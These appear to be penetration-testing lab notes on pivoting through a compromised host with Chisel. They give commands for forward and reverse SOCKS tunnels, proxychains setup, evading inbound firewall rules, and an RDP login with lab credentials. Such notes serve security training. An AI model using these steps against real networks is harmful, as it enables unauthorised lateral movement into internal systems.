Basically dynamic port forwarding.

1. Setting up Chisel
	- `git clone https://github.com/jpillora/chisel.git`
	- `cd chisel`
	- `go build`
2. Transfer Chisel Binary to Pivot Host
	- `scp chisel ubuntu@10.129.202.64:~/`
3. Run Chisel Server on Pivot Host
	- `./chisel server -v -p 1234 --socks5`
	- Listener on pivot will listen on port 1234 using socks5, forward it to all networks that are accessible from the pivot host
4. Start client on attack host and connect
	- `./chisel client -v 10.129.202.64:1234 socks
	- 10.129.202.64:1234 is the Chisel Server (pivot host) listener port
5. The above will show that client now has a SOCKS listener on a specific port (eg. 1080), modify `/etc/proxychains.conf` to use proxychains to pivot using the created tunnel
6. Then run tool (with proxychains prefix) normally
	- `proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`

We can also do it the reverse way, with the pivot machine as the client, and our attack host as server.
- Use case: **firewall rules restrict inbound connections from our machine to compromised target**

1. Start Chisel server on attack host
	- `sudo ./chisel server --reverse -v -p 1234 --socks5
2. Transfer Chisel binary to Pivot host
	- `scp chisel ubuntu@10.129.202.64:~/`
3. Run Chisel client on Pivot host
	- `./chisel client -v 10.10.14.17:1234 R:socks`
		- R:socks -> listens on default socks port 1080
		- Note: this creates a SOCKS listener **still on the attack host (ie server)**
4. Modify `/etc/proxychains.conf` to send to 1080 (ON OUR MACHINE)
5. Run tool with proxychains
